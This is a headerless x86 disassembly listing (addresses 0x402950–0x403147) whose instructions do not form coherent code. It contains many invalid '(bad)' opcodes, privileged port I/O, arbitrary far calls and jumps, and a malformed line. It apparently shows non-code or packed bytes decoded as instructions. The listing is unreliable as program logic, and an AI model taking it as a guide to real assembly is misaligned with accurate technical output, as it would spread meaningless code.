  402950:	add    DWORD PTR [edx-0x1b],esi
  402953:	adc    edx,DWORD PTR [esi+eiz*2+0x6cfab77d]
  40295a:	sbb    eax,0xdc19b225
  40295f:	or     cl,dl
  402961:	pushf  
  402962:	icebp  
  402963:	mov    al,0xb7
  402965:	or     ch,0x98
  402968:	fstp   TBYTE PTR [edx]
  40296a:	jnp    0x402997
  40296c:	xchg   ebp,eax
  40296d:	das    
  40296e:	sbb    al,0xb3
  402970:	repz daa 
  402972:	cdq    
  402973:	sar    DWORD PTR ss:[eax+0x5e],0x90
  402978:	push   ebx
  402979:	outs   dx,DWORD PTR ds:[esi]
  40297a:	ret    0xb466
  40297d:	mov    eax,0xe43db437
  402982:	(bad)  
  402983:	aas    
  402984:	in     al,dx
  402985:	mov    bh,0x55
  402987:	shr    BYTE PTR [eax-0x37650c7f],cl
  40298d:	mov    DWORD PTR [eax-0x70d59682],edi
  402993:	mov    esp,DWORD PTR [ecx+ecx*4-0x42d7f217]
  40299a:	stos   BYTE PTR es:[edi],al
  40299b:	out    0xeb,eax
  40299d:	mov    ch,0x62
  40299f:	dec    ebp
  4029a0:	sub    eax,0xff53e3f0
  4029a5:	ret    
  4029a6:	test   DWORD PTR [edi],esp
  4029a8:	lea    edi,[esi-0x56]
  4029ab:	add    BYTE PTR [ecx-0x6d],0x11
  4029af:	xchg   DWORD PTR [eax-0x593415b9],esp
  4029b5:	push   es
  4029b6:	sar    edi,0xfa
  4029b9:	pop    esp
  4029ba:	mov    ebx,0x4ad577b9
  4029bf:	imul   esi,DWORD PTR [esi-0x4c0f971b],0xffffffba
  4029c6:	mov    BYTE PTR [eax-0x12],dl
  4029c9:	inc    edx
  4029ca:	dec    eax
  4029cb:	pop    ebp
  4029cc:	popf   
  4029cd:	pop    esp
  4029ce:	push   ecx
  4029cf:	or     eax,DWORD PTR [ebp+ebx*8-0xdc13ad2]
  4029d6:	lea    ebx,[ebp+0x5ed11705]
  4029dc:	xchg   esi,eax
  4029dd:	outs   dx,BYTE PTR ds:[esi]
  4029de:	std    
  4029df:	jge    0x40299c
  4029e1:	push   edi
  4029e2:	outs   dx,DWORD PTR ds:[esi]
  4029e3:	fnsave [edi]
  4029e5:	(bad)  
  4029e6:	xlat   BYTE PTR ds:[ebx]
  4029e7:	call   0x68f4:0xece3018
  4029ee:	mov    cl,0x4b
  4029f0:	loop   0x4029e7
  4029f2:	or     al,0xa5
  4029f4:	pushf  
  4029f5:	mov    esi,0x99e4ff96
  4029fa:	cmp    dl,BYTE PTR ds:0x88ac9d36
  402a00:	call   0x242a:0xba8c5d72
  402a07:	xchg   edi,eax
  402a08:	scas   eax,DWORD PTR es:[edi]
  402a09:	sub    eax,0x59e34439
  402a0e:	(bad)  
  402a0f:	loopne 0x402a6e
  402a11:	push   cs
  402a12:	push   di
  402a14:	xor    eax,0xdc65424
  402a19:	xor    dh,BYTE PTR [ebx-0x1975717f]
  402a1f:	cmp    eax,DWORD PTR [ebx+edx*1+0x38d2b604]
  402a26:	sub    esp,DWORD PTR [ecx+ecx*1-0x4472aed0]
  402a2d:	in     al,dx
  402a2e:	push   0xffffffb7
  402a30:	vpsignd ymm5,ymm1,YMMWORD PTR [ecx]
  402a35:	dec    edi
  402a36:	inc    ebx
  402a37:	psubsb mm3,QWORD PTR [edi+edi*2+0x1f85633e]
  402a3f:	js     0x402aa3
  402a41:	call   0xd5e2:0x73c744de
  402a48:	pusha  
  402a49:	adc    DWORD PTR [eax],ebp
  402a4b:	stos   BYTE PTR es:[edi],al
  402a4c:	out    0x9b,al
  402a4e:	mov    ecx,0xceec77dd
  402a53:	add    esp,DWORD PTR [esi+ebp*4-0xa22a4]
  402a5a:	enter  0x58e9,0x25
  402a5e:	ficomp WORD PTR [ebp-0x1f909c3e]
  402a64:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402a65:	in     eax,dx
  402a66:	add    bh,BYTE PTR [esi]
  402a68:	dec    ecx
  402a69:	sub    DWORD PTR [eax],0x65
  402a6c:	sub    bh,bl
  402a6e:	out    0x7,al
  402a70:	sti    
  402a71:	stc    
  402a72:	inc    edx
  402a73:	int3   
  402a74:	mov    al,ds:0xc1256b99
  402a79:	popf   
  402a7a:	mov    ds:0xef90fe54,al
  402a7f:	mov    al,ds:0x3dff3a54
  402a84:	loopne 0x402ae7
  402a86:	add    edx,edi
  402a88:	mov    esp,0x33b92425
  402a8d:	adc    eax,0xcb725af9
  402a92:	xor    eax,DWORD PTR [ebp+0x57497dbb]
  402a98:	mov    ds,WORD PTR [ebp-0x39aafb61]
  402a9e:	push   ds
  402a9f:	outs   dx,DWORD PTR ds:[esi]
  402aa0:	inc    ebx
  402aa1:	mov    edi,0x35662ec8
  402aa6:	sbb    edx,DWORD PTR [esp+ebx*1-0x42]
  402aaa:	xor    bh,BYTE PTR [edx-0x12b468d4]
  402ab0:	and    dl,BYTE PTR [ecx+0xc294a0d]
  402ab6:	lock inc esp
  402ab8:	sbb    BYTE PTR [edi+0x9],ch
  402abb:	dec    esi
  402abc:	jge    0x402b2c
  402abe:	aaa    
  402abf:	mov    ds:0x7ee9f890,al
  402ac4:	pop    eax
  402ac5:	jns    0x402b00
  402ac7:	test   eax,0x908dcfdc
  402acc:	enter  0x29c,0x91
  402ad0:	sub    al,0xc8
  402ad2:	pusha  
  402ad3:	pop    ds
  402ad4:	pop    ds
  402ad5:	test   eax,0x9c1befee
  402ada:	lods   eax,DWORD PTR ds:[esi]
  402adb:	mov    DWORD PTR [ebx+0x68],0x3193e73b
  402ae2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402ae3:	mov    al,0x85
  402ae5:	add    BYTE PTR [ebx+0x4d464c3f],al
  402aeb:	dec    edi
  402aec:	hlt    
  402aed:	push   edx
  402aee:	pop    ss
  402aef:	imul   ebp,DWORD PTR [edx+0x5dec71fd],0x1e
  402af6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402af7:	and    eax,0xb3c953cb
  402afc:	fwait
  402afd:	push   edi
  402afe:	mov    eax,0x5714c783
  402b03:	mov    ch,0xc7
  402b05:	adc    esp,esi
  402b07:	daa    
  402b08:	loop   0x402ad7
  402b0a:	loopne 0x402b3d
  402b0c:	stos   DWORD PTR es:[edi],eax
  402b0d:	aas    
  402b0e:	mov    dl,al
  402b10:	adc    esp,DWORD PTR [edx+ebx*8+0x7a]
  402b14:	sbb    eax,ecx
  402b16:	aad    0xcd
  402b18:	std    
  402b19:	jp     0x402ae5
  402b1b:	es das 
  402b1d:	push   esp
  402b1e:	dec    ebx
  402b1f:	call   0x3ec5ede5
  402b24:	jns    0x402b16
  402b26:	jnp    0x402b05
  402b28:	retf   0xe8fa
  402b2b:	jecxz  0x402b8d
  402b2d:	ror    BYTE PTR [esi+0x235e1d5e],1
  402b33:	mov    edx,DWORD PTR [eax-0xc]
  402b36:	dec    esi
  402b37:	mov    eax,ds:0xbee794c1
  402b3c:	mov    esp,0xb963ee2b
  402b41:	cmp    ebp,edx
  402b43:	jg     0x402b1d
  402b45:	out    dx,al
  402b46:	sbb    ebp,DWORD PTR [esi+edi*1]
  402b49:	daa    
  402b4a:	sub    DWORD PTR [esi],ebp
  402b4c:	test   BYTE PTR [edx+eiz*8-0x64],cl
  402b50:	arpl   WORD PTR [ebx],sp
  402b52:	test   DWORD PTR ds:[eax+0x4200107c],esi
  402b59:	sub    BYTE PTR [edi-0x510dbe05],0x3f
  402b60:	and    eax,0xe9c63148
  402b65:	mov    esp,ecx
  402b67:	mov    ah,0x5b
  402b69:	lea    eax,[edx-0x2c]
  402b6c:	xchg   esi,eax
  402b6d:	mov    eax,ds:0xe5b15e50
  402b72:	std    
  402b73:	pop    edx
  402b74:	les    esi,FWORD PTR [ecx-0x51844dc8]
  402b7a:	test   DWORD PTR [esi-0x57],ebp
  402b7d:	xor    eax,0xd5343467
  402b82:	(bad)  [ecx+ebx*1]
  402b85:	cli    
  402b86:	xchg   eax,edi
  402b88:	mov    ebx,0x31261ee8
  402b8d:	imul   eax,DWORD PTR [ecx],0x2d
  402b90:	pushw  ds
  402b92:	mov    eax,0x9d0dd51f
  402b97:	mov    edx,0x4431e970
  402b9c:	and    al,0xa6
  402b9e:	pop    ebx
  402b9f:	mov    ds:0x74ff965,eax
  402ba4:	cmp    bh,ch
  402ba6:	mov    bl,0x2
  402ba8:	(bad)  
  402baa:	or     ecx,esi
  402bac:	mov    edi,0xa18434b8
  402bb1:	out    dx,al
  402bb2:	add    edi,0x71
  402bb5:	jmp    0x1daf:0x74268f3b
  402bbc:	sbb    al,0x18
  402bbe:	out    0xd1,eax
  402bc0:	shl    ebp,0x7e
  402bc3:	outs   dx,DWORD PTR ds:[esi]
  402bc4:	jmp    0x649c0ed1
  402bc9:	xchg   ebx,eax
  402bca:	stos   DWORD PTR es:[edi],eax
  402bcb:	addr16 cdq 
  402bcd:	push   ecx
  402bce:	out    0x7d,eax
  402bd0:	mov    esi,0xe285990b
  402bd5:	les    esi,FWORD PTR [eax]
  402bd7:	adc    DWORD PTR [ecx+0x54],0xefeb8d73
  402bde:	xchg   ecx,eax
  402bdf:	into   
  402be0:	out    0x84,eax
  402be2:	ins    BYTE PTR es:[edi],dx
  402be3:	cld    
  402be4:	xchg   ebx,eax
  402be5:	in     al,0x17
  402be7:	stos   DWORD PTR es:[edi],eax
  402be8:	(bad)  
  402be9:	pop    edi
  402bea:	xchg   edx,eax
  402beb:	stc    
  402bec:	fimul  DWORD PTR [ecx+edi*4+0x43b8abd4]
  402bf3:	push   ebp
  402bf4:	hlt    
  402bf5:	xor    bl,BYTE PTR [eax+0x215b166e]
  402bfb:	enter  0x88cb,0xaf
  402bff:	popf   
  402c00:	inc    edi
  402c01:	popa   
  402c02:	lds    esi,FWORD PTR [ecx-0x6c]
  402c05:	mov    dh,0x35
  402c07:	call   0xa5f863fc
  402c0c:	stos   BYTE PTR es:[edi],al
  402c0d:	mov    eax,ds:0xb89f119f
  402c12:	push   ds
  402c13:	es dec edx
  402c15:	pop    ds
  402c16:	fdivr  DWORD PTR [edi+0x54]
  402c19:	(bad)  
  402c1a:	fwait
  402c1b:	pop    edi
  402c1c:	iret   
  402c1d:	std    
  402c1e:	xor    eax,0x6d25da03
  402c23:	adc    eax,0xfef5b7df
  402c28:	adc    al,0x81
  402c2a:	push   0x7818e52d
  402c2f:	in     al,dx
  402c30:	or     ecx,0x3c79cab4
  402c36:	bound  sp,DWORD PTR [eax-0x648ce563]
  402c3d:	add    bh,BYTE PTR [edi+0x1e836280]
  402c43:	inc    eax
  402c44:	shl    DWORD PTR es:[eax-0xe],0xe3
  402c49:	jmp    0xffd0e192
  402c4e:	sub    al,0x83
  402c50:	pop    ebx
  402c51:	adc    al,0x4c
  402c53:	xchg   ebp,eax
  402c54:	sub    BYTE PTR [esi+0x30c7aa9d],al
  402c5a:	dec    eax
  402c5b:	leave  
  402c5c:	sub    dh,bh
  402c5e:	sub    BYTE PTR [eax+eax*4-0x7fc087ca],bh
  402c65:	mov    ecx,0xb87c0cf2
  402c6a:	loopne 0x402ce3
  402c6c:	sub    al,0x70
  402c6e:	push   ebp
  402c6f:	jle    0x402c0a
  402c71:	or     BYTE PTR [edx+0x77],ch
  402c74:	pop    ebp
  402c75:	lds    esi,FWORD PTR [edi]
  402c77:	mov    edi,0xe8eb8fe
  402c7c:	cwde   
  402c7d:	ror    DWORD PTR [ebp+0x324a125c],cl
  402c83:	pushf  
  402c84:	fist   DWORD PTR [edx-0x3c]
  402c87:	enter  0x1dca,0xe8
  402c8b:	fnstenv [eax+0x78]
  402c8e:	or     al,BYTE PTR [edx+0x61de36b4]
  402c94:	dec    esp
  402c95:	add    al,0x51
  402c97:	xchg   DWORD PTR [edx],esi
  402c99:	fadd   DWORD PTR [esi]
  402c9b:	fcom   QWORD PTR [edx]
  402c9d:	test   al,0xf1
  402c9f:	scas   al,BYTE PTR es:[edi]
  402ca0:	addr16 push 0x7f
  402ca3:	xchg   ebx,eax
  402ca4:	mov    ds:0xc56c5ac4,eax
  402ca9:	xchg   ecx,ebp
  402cab:	pop    ss
  402cac:	cmp    eax,0xe1df7216
  402cb1:	fst    QWORD PTR [esi]
  402cb3:	sti    
  402cb4:	aam    0x9a
  402cb6:	pop    esp
  402cb7:	push   DWORD PTR [esp+ebp*1]
  402cba:	stos   DWORD PTR es:[edi],eax
  402cbb:	ss emms 
  402cbe:	mov    dh,dl
  402cc0:	neg    ah
  402cc2:	lock fwait
  402cc4:	mov    dh,0xb1
  402cc6:	es dec ebp
  402cc8:	add    dl,ah
  402cca:	inc    edx
  402ccb:	int    0xe9
  402ccd:	pop    esp
  402cce:	leave  
  402ccf:	fst    QWORD PTR cs:[edx*1-0x295c60c1]
  402cd7:	inc    ebx
  402cd8:	iret   
  402cd9:	or     eax,0x3fe25bfd
  402cde:	push   ebp
  402cdf:	xchg   BYTE PTR [ebx+eax*8],ah
  402ce2:	nop
  402ce3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402ce4:	imul   esp,DWORD PTR [eax-0x7d],0xffffffc2
  402ce8:	jecxz  0x402d5a
  402cea:	dec    esi
  402ceb:	imul   esi,eax,0xffffffd1
  402cee:	mov    bl,0x87
  402cf0:	enter  0xec55,0x83
  402cf4:	call   0xeb6d501f
  402cf9:	leave  
  402cfa:	es and bh,al
  402cfd:	xor    cl,BYTE PTR [eax+0x1b22c2e8]
  402d03:	jmp    0xe7953d4f
  402d08:	out    0x79,eax
  402d0a:	jb     0x402d13
  402d0c:	test   eax,0xe6a5b91a
  402d11:	mov    ebx,0xd4d33a4b
  402d16:	jne    0x402ce3
  402d18:	sbb    DWORD PTR [edx-0x76],eax
  402d1b:	xlat   BYTE PTR ds:[ebx]
  402d1c:	test   BYTE PTR [ebx+0x6fd9e977],0x48
  402d23:	push   ecx
  402d24:	push   bp
  402d26:	add    DWORD PTR [edi+0x5ce2533],eax
  402d2c:	rcl    BYTE PTR [edi-0x5c9dc1ac],1
  402d32:	inc    ebx
  402d33:	scas   al,BYTE PTR es:[edi]
  402d34:	inc    ebx
  402d35:	or     DWORD PTR [ebx+esi*4-0x13a138c8],edx
  402d3c:	mov    DWORD PTR [ecx+0x6],esi
  402d3f:	jge    0x402ce7
  402d41:	jmp    0x609c444a
  402d46:	mov    al,ds:0xde2c5a76
  402d4b:	adc    BYTE PTR [esi],0x0
  402d4e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402d4f:	mov    dl,0x4a
  402d51:	jle    0x402ce5
  402d53:	mov    fs,WORD PTR [ecx]
  402d55:	std    
  402d56:	mov    bh,0x1e
  402d58:	xor    ebx,0xb2270149
  402d5e:	jg     0x402d2c
  402d60:	cmp    DWORD PTR [edx],edi
  402d62:	into   
  402d63:	pop    eax
  402d64:	inc    esi
  402d65:	jecxz  0x402db8
  402d67:	push   0xffffffbe
  402d69:	jle    0x402d15
  402d6b:	adc    ecx,DWORD PTR [edx+0x35]
  402d6e:	data16 jne 0x402da0
  402d71:	add    BYTE PTR [ecx-0x70f5002f],ah
  402d77:	pushf  
  402d78:	adc    dh,BYTE PTR [edi-0x1d]
  402d7b:	es pop eax
  402d7d:	or     al,0x14
  402d7f:	jmp    0x402de7
  402d81:	or     esp,DWORD PTR [eax+eiz*1+0x29b373e2]
  402d88:	pop    ebx
  402d89:	push   cs
  402d8a:	gs in  al,0xaa
  402d8d:	dec    edx
  402d8e:	inc    esp
  402d8f:	aam    0x42
  402d91:	jmp    0x402de5
  402d93:	iret   
  402d94:	sbb    ecx,DWORD PTR ds:0x65025c06
  402d9a:	(bad)  
  402d9c:	push   0xffffff9a
  402d9e:	lods   eax,DWORD PTR ds:[esi]
  402d9f:	mov    bh,bh
  402da1:	mov    ecx,0xf9b43b47
  402da6:	pop    eax
  402da7:	cmp    esi,DWORD PTR [edx]
  402da9:	loopne 0x402d73
  402dab:	xor    al,dh
  402dad:	cmp    al,0x6
  402daf:	out    dx,al
  402db0:	jo     0x402d33
  402db2:	loopne 0x402daa
  402db4:	mov    cl,0x46
  402db6:	sub    ah,ah
  402db8:	mov    eax,0x3faa8050
  402dbd:	pusha  
  402dbe:	push   ecx
  402dbf:	push   ebx
  402dc0:	daa    
  402dc1:	scas   eax,DWORD PTR es:[edi]
  402dc2:	and    eax,0x2ef47de9
  402dc7:	pop    ss
  402dc8:	push   ss
  402dc9:	popa   
  402dca:	pop    eax
  402dcb:	test   ebp,edx
  402dcd:	mov    dh,0xa5
  402dcf:	mov    ch,0x89
  402dd1:	adc    ebp,0x8651af00
  402dd7:	or     BYTE PTR [esi],ch
  402dd9:	push   eax
  402dda:	mov    ecx,0xc04f55ee
  402ddf:	popf   
  402de0:	aas    
  402de1:	xor    dl,0x4d
  402de4:	dec    esp
  402de5:	scas   al,BYTE PTR es:[edi]
  402de6:	in     al,dx
  402de7:	inc    ax
  402de9:	adc    BYTE PTR [eax+0x63],bl
  402dec:	mov    ch,0xd5
  402dee:	add    DWORD PTR [eax+0x55708b66],edx
  402df4:	mov    ecx,0x88f24259
  402df9:	and    bl,BYTE PTR [esi-0x117a4057]
  402dff:	jl     0x402dd5
  402e01:	(bad)  ds:0x45ee31a8
  402e07:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402e08:	je     0x402e17
  402e0a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402e0b:	add    eax,ebp
  402e0d:	sub    BYTE PTR [edi-0x27],cl
  402e10:	fs dec edx
  402e12:	push   0x6260243
  402e17:	jne    0x402e45
  402e19:	shl    BYTE PTR [eax+0x29d7bf05],0x29
  402e20:	and    al,0xb4
  402e22:	sub    BYTE PTR [esi],cl
  402e24:	sbb    DWORD PTR [ebx-0x42],0x56
  402e28:	dec    ebx
  402e29:	es inc esp
  402e2b:	mov    ds:0x9a9e4c17,eax
  402e30:	stc    
  402e31:	ds pop esi
  402e33:	mov    esp,0xc2261c95
  402e38:	int    0xc4
  402e3a:	xchg   ebp,eax
  402e3b:	xor    al,0x29
  402e3d:	pop    ebp
  402e3e:	mov    bl,0x36
  402e40:	into   
  402e41:	add    BYTE PTR [ebp+0x2b],dh
  402e44:	adc    esp,DWORD PTR [ebp+0x1d]
  402e47:	mov    ecx,0xf4753002
  402e4c:	shl    DWORD PTR [edx],cl
  402e4e:	inc    ebx
  402e4f:	mov    eax,ds:0x3aad0c3b
  402e54:	push   ecx
  402e55:	adc    BYTE PTR [ebp-0x21],0xcc
  402e59:	add    DWORD PTR [esi],ebp
  402e5b:	cli    
  402e5c:	mov    bl,0x43
  402e5e:	daa    
  402e5f:	pop    eax
  402e60:	stos   DWORD PTR es:[edi],eax
  402e61:	dec    edx
  402e62:	push   edx
  402e63:	(bad)  
  402e64:	cdq    
  402e65:	or     eax,DWORD PTR [ecx]
  402e67:	mov    edx,0xab234b5a
  402e6c:	aas    
  402e6d:	sar    edi,0x51
  402e70:	mov    ecx,0x7cf7b9a3
  402e75:	push   edx
  402e76:	sbb    BYTE PTR [esi+0x12],bl
  402e79:	pop    eax
  402e7a:	push   ebx
  402e7b:	fwait
  402e7c:	dec    esp
  402e7d:	mov    edx,0x2deb9c92
  402e82:	fld    QWORD PTR [ebx-0x3f27b13f]
  402e88:	hlt    
  402e89:	add    eax,0xa1728d5
  402e8e:	add    ah,cl
  402e90:	or     esi,0xfffffff5
  402e93:	stc    
  402e94:	pop    ebp
  402e95:	xor    al,0x49
  402e97:	shl    BYTE PTR [edi],0xeb
  402e9a:	retf   0xd20b
  402e9d:	in     eax,0xbc
  402e9f:	lds    edx,FWORD PTR [eax+0x11fd9135]
  402ea5:	cmp    BYTE PTR [ebp+0x674b0aa6],0xee
  402eac:	mov    BYTE PTR [ecx],ch
  402eae:	inc    edx
  402eaf:	nop
  402eb0:	adc    BYTE PTR [ebx-0x39],dh
  402eb3:	adc    bh,BYTE PTR [edi]
  402eb5:	inc    edx
  402eb6:	push   ebx
  402eb7:	and    bh,0x4e
  402eba:	je     0x402e43
  402ebc:	push   edx
  402ebd:	test   eax,0xe8f8bd44
  402ec2:	call   0xb4bc:0xec43da4c
  402ec9:	or     ah,BYTE PTR [ebp+0x4b]
  402ecc:	or     BYTE PTR [eax-0x428e6b7f],0xf6
  402ed3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402ed4:	js     0x402e65
  402ed6:	aas    
  402ed7:	add    esp,DWORD PTR [edx-0x2f]
  402eda:	mov    eax,ds:0x3be1e507
  402edf:	outs   dx,DWORD PTR ds:[esi]
  402ee0:	clc    
  402ee1:	mov    ecx,?
  402ee3:	xchg   edi,eax
  402ee4:	lds    edi,FWORD PTR [eax]
  402ee6:	hlt    
  402ee7:	loop   0x402e92
  402ee9:	test   BYTE PTR [eax],cl
  402eeb:	lahf   
  402eec:	fild   QWORD PTR [ebx-0x24]
  402eef:	popf   
  402ef0:	out    dx,al
  402ef1:	fnstcw WORD PTR [ebp+0x4c]
  402ef4:	repz push ecx
  402ef6:	pop    eax
  402ef7:	pop    ss
  402ef8:	in     eax,dx
  402ef9:	call   0xe4d5:0x4c64ad9f
  402f00:	xor    ebx,0x13
  402f03:	xchg   esp,eax
  402f04:	cmp    ecx,DWORD PTR [edi]
  402f06:	cld    
  402f07:	bound  esp,QWORD PTR es:[ecx]
  402f0a:	xlat   BYTE PTR ds:[ebx]
  402f0b:	test   edi,ebp
  402f0d:	push   edx
  402f0e:	inc    ebx
  402f0f:	das    
  402f10:	dec    ebx
  402f11:	test   BYTE PTR [edx+0x353ffda4],al
  402f17:	push   edi
  402f18:	fs pushf 
  402f1a:	mov    al,ds:0x39bcf999
  402f1f:	mov    edi,0x3be6c72a
  402f24:	jecxz  0x402f15
  402f26:	sub    al,0xc
  402f28:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402f29:	xor    eax,0xc1936753
  402f2e:	push   esp
  402f2f:	xchg   BYTE PTR [ebp+0x52284455],al
  402f35:	aas    
  402f36:	push   esp
  402f37:	mov    bh,0x12
  402f39:	jnp    0x402f57
  402f3b:	push   esp
  402f3c:	test   al,0x7b
  402f3e:	es in  eax,dx
  402f40:	out    dx,eax
  402f41:	xchg   edi,eax
  402f42:	dec    DWORD PTR [ecx-0x43]
  402f45:	mov    eax,ds:0xee285992
  402f4a:	mov    dl,0x9d
  402f4c:	fs lahf 
  402f4e:	fist   WORD PTR [ecx]
  402f50:	js     0x402fb9
  402f52:	dec    eax
  402f53:	cli    
  402f54:	shl    bl,0x9b
  402f57:	mov    edi,0x2c78c1bd
  402f5c:	inc    ebx
  402f5d:	push   edx
  402f5e:	sbb    BYTE PTR [ebx-0x1c],0x54
  402f62:	push   edi
  402f63:	mov    ebp,0x8f701887
  402f68:	mov    ch,0x24
  402f6a:	fwait
  402f6b:	sub    al,0xee
  402f6d:	out    0xc4,al
  402f6f:	or     ah,bh
  402f71:	stc    
  402f72:	dec    edx
  402f73:	rcl    eax,1
  402f75:	pop    ebx
  402f76:	mov    BYTE PTR [ecx],ah
  402f78:	mov    edi,esp
  402f7a:	sub    dh,bl
  402f7c:	shl    DWORD PTR [esi+0x1],cl
  402f7f:	or     eax,0x1b7e231f
  402f84:	inc    esp
  402f85:	add    edi,ebx
  402f87:	ret    
  402f88:	mov    dl,0xea
  402f8a:	adc    eax,0x9cdaae7d
  402f8f:	mov    eax,ds:0xe750d0b4
  402f94:	xchg   esi,eax
  402f95:	adc    DWORD PTR [eax],eax
  402f97:	jp     0x402f34
  402f99:	aaa    
  402f9a:	test   al,0x54
  402f9c:	adc    eax,0x6dc27417
  402fa1:	add    eax,0xbbe2c2bd
  402fa6:	jmp    FWORD PTR [ecx-0x4aabe822]
  402fac:	xor    ch,BYTE PTR [ecx+0x3df48def]
  402fb2:	call   0x686b182
  402fb7:	mov    dl,0x89
  402fb9:	int3   
  402fba:	mov    cl,0x83
  402fbc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402fbd:	hlt    
  402fbe:	inc    edi
  402fbf:	sub    bl,BYTE PTR [eax-0x51282faf]
  402fc5:	add    ebp,DWORD PTR [eax-0x45]
  402fc8:	je     0x402f96
  402fca:	sub    BYTE PTR [esi+0x66],ah
  402fcd:	or     al,BYTE PTR [ecx+0x6c123577]
  402fd3:	out    dx,eax
  402fd4:	retf   
  402fd5:	fisubr DWORD PTR [eax+0x78655535]
  402fdb:	jge    0x402f78
  402fdd:	test   eax,0x32ccdc
  402fe2:	ret    0x2374
  402fe5:	jge    0x402fc6
  402fe7:	mov    dh,0x1e
  402fe9:	ret    0xddbb
  402fec:	popf   
  402fed:	dec    esi
  402fee:	and    BYTE PTR [esi+0x5d],bl
  402ff1:	cmp    BYTE PTR [edi-0x6697117c],0x33
  402ff8:	lock call 0x8d278657
  402ffe:	inc    ecx
  402fff:	scas   eax,DWORD PTR es:[edi]
  403000:	mov    al,ds:0x462fdd29
  403005:	xor    DWORD PTR [edx],ecx
  403007:	in     eax,0xcb
  403009:	lods   eax,DWORD PTR ds:[esi]
  40300a:	mov    bh,0x5e
  40300c:	out    0xc5,al
  40300e:	push   edi
  40300f:	sbb    eax,0x76016e97
  403014:	pop    eax
  403015:	cli    
  403016:	and    eax,0x93fe7248
  40301b:	mov    dl,0xb9
  40301d:	retf   0x257b
  403020:	fs push edx
  403022:	outs   dx,DWORD PTR ds:[esi]
  403023:	sub    DWORD PTR ds:0x6bb6d005,edx
  403029:	popa   
  40302a:	dec    eax
  40302b:	in     eax,0x1f
  40302d:	push   edx
  40302e:	fistp  DWORD PTR cs:[ebx-0x72]
  403032:	retf   
  403033:	push   edx
  403034:	hlt    
  403035:	dec    ch
  403037:	push   edi
  403038:	add    cl,BYTE PTR [edx-0x49845fc0]
  40303e:	mov    ss,ecx
  403040:	xchg   ebx,eax
  403041:	push   es
  403042:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403043:	(bad)  
  403044:	fs adc ch,dh
  403047:	stc    
  403048:	mov    ebx,0x12850d78
  40304d:	mov    dl,0x98
  40304f:	xchg   DWORD PTR ds:0xd1127cbb,edx
  403055:	cmp    eax,0x9ed73441
  40305a:	push   edx
  40305b:	jge    0x4030af
  40305d:	or     DWORD PTR [eax-0xf],edi
  403060:	ret    
  403061:	cmp    eax,0x2d9ba0da
  403066:	jg     0x4030c0
  403068:	cmc    
  403069:	stc    
  40306a:	lahf   
  40306b:	mov    al,0xe6
  40306d:	xlat   BYTE PTR ds:[ebx]
  40306e:	dec    ebp
  40306f:	ja     0x40306c
  403071:	jae    0x403025
  403073:	sbb    BYTE PTR [edx+esi*1+0x519936a],cl
  40307a:	xor    eax,0xdd0cd56f
  40307f:	outs   dx,DWORD PTR ds:[esi]
  403080:	scas   al,BYTE PTR es:[edi]
  403081:	jbe    0x4030f3
  403083:	lods   al,BYTE PTR ds:[esi]
  403084:	pop    esi
  403085:	jl     0x40300e
  403087:	pop    edi
  403088:	jb     0x403078
  40308a:	call   edi
  40308c:	les    edx,FWORD PTR [edx+0x1]
  40308f:	(bad)  
  403090:	push   0xffffff88
  403092:	adc    DWORD PTR [ecx+0x5b187ebf],ecx
  403098:	xchg   ecx,eax
  403099:	inc    esp
  40309a:	(bad)  
  40309b:	pop    eax
  40309c:	imul   esi,DWORD PTR [ebx-0x35],0x2068fbc3
  4030a3:	loope  0x403093
  4030a5:	cmp    BYTE PTR [ecx+0x22],ch
  4030a8:	mov    edx,0x50cbd30b
  4030ad:	xchg   BYTE PTR [edi-0x3a],ch
  4030b0:	push   cs
  4030b1:	fwait
  4030b2:	gs dec esp
  4030b4:	iret   
  4030b5:	lea    ebp,[edx+0x1]
  4030b8:	ficomp WORD PTR [edx-0x2f6ffab3]
  4030be:	(bad)  
  4030c0:	or     al,0x7c
  4030c2:	idiv   BYTE PTR [eax+ebx*2]
  4030c5:	push   0xffffffe2
  4030c7:	stos   DWORD PTR es:[edi],eax
  4030c8:	retf   0xb047
  4030cb:	call   0xf82cc9e0
  4030d0:	clc    
  4030d1:	mov    esp,0x9f0a4c2a
  4030d6:	add    eax,DWORD PTR [eax]
  4030d8:	add    ebx,ebp
  4030da:	push   esi
  4030db:	bnd ja 0x40311f
  4030de:	mov    bl,0xd3
  4030e0:	jmp    FWORD PTR [eax]
  4030e2:	outs   dx,DWORD PTR ds:[esi]
  4030e3:	mov    ebp,0x8fdca100
  4030e8:	fnstsw WORD PTR [ebx+edi*8-0x37161e34]
  4030ef:	pop    eax
  4030f0:	int3   
  4030f1:	push   ds
  4030f2:	dec    ebx
  4030f3:	push   eax
  4030f4:	dec    esp
  4030f5:	sub    eax,0x5d089bf7
  4030fa:	loope  0x4030ae
  4030fc:	or     DWORD PTR [esi],ecx
  4030fe:	in     eax,0x85
  403100:	push   eax
  403101:	mov    gs,WORD PTR [esi+esi*1-0x70]
  403105:	clc    
  403106:	jns    0x403161
  403108:	and    cl,al
  40310a:	push   eax
  40310b:	popa   
  40310c:	push   edx
  40310d:	sbb    eax,0xb70af09e
  403112:	inc    ebp
  403113:	jne    0x403158
  403115:	pop    ecx
  403116:	xchg   ebx,eax
  403117:	out    dx,al
  403118:	and    BYTE PTR [edx+eiz*1],bl
  40311b:	push   edx
  40311c:	cdq    
  40311d:	into   
  40311e:	hlt    
  40311f:	push   cs
  403120:	sbb    BYTE PTR [edi],bh
  403122:	call   0x42ea9e20
  403127:	mov    BYTE PTR [esi+ebp*1-0x616f6dd5],bl
  40312e:	jnp    0x403131
  403130:	imul   BYTE PTR [ebx-0x7c]
  403133:	jge    0x403148
  403135:	jmp    0x676557d0
  40313a:	test   BYTE PTR [ebp+0x6b1460e4],dh
  403140:	(bad)  
  403141:	mov    BYTE PTR [esi-0x56a08edb],bl
  403147:	enter  0xbfad,0x1f
